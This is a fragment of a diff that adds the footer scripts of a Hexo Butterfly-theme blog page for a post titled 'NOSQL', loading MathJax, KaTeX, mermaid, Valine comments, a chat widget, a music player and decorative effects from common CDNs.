src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://upload.love/2021/04/20/NOSQL/'
+    this.page.identifier = '2021/04/20/NOSQL/'
+    this.page.title = 'NOSQL'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
